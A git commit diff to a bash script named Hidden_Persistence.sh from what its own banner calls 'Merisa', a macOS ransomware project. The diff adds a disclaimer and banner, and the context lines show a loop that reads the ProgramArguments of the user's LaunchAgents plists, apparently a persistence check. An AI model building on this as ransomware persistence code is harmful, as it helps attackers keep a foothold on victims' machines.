fe26a4e558dc1ed655e8fdbc509c2ea46cab4996
Shellbear <antoine.ordonez@gmail.com>
2017-06-24 23:45:02 +0200

    Update Hidden_Persistence.sh

--- Scripts/Hidden_Persistence.sh
+++ Scripts/Hidden_Persistence.sh
@@ -1,5 +1,16 @@
 #!/bin/bash
-#By Shellbear Github.com/shellbear
+#By Shellbear - github.com/shellbear
+#Notice : This project was made by ShellBear (github.com/shellbear)
+#For educational purposes only, so don't use it on computer you don't own !
+#I don't hold any responsibility for the bad use of this tool,
+#Remember that attacking targets without prior consent is illegal and punished by law.
+
+
+#    Welcome to Merisa
+#     ╔╦╗╔═╗╦═╗╦╔═╗╔═╗
+#     ║║║║╣ ╠╦╝║╚═╗╠═╣
+#     ╩ ╩╚═╝╩╚═╩╚═╝╩ ╩
+#The MacOS ransomware project
 
 ls -1 ~/Library/LaunchAgents | while read line; do 
 item=$(cat ~/Library/LaunchAgents/$line | grep -A 2 "<key>ProgramArguments</key>" | grep -Eo "<string>[^ ].*" | sed 's,</string>,,g' | sed 's,<string>,,g')
